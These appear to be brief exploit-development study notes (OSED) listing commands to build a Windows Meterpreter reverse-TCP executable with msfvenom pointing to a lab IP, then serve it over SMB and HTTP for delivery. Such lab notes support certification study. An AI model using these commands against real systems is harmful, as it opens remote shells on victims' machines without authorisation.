# x86Win-OSED-Notes

met payload:
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.178 LPORT=4343 -f exe -o met.exe

smbserver:
  sudo smbserver.py met /home/kali/ -smb2support

http-server:
  python3 -m http.server
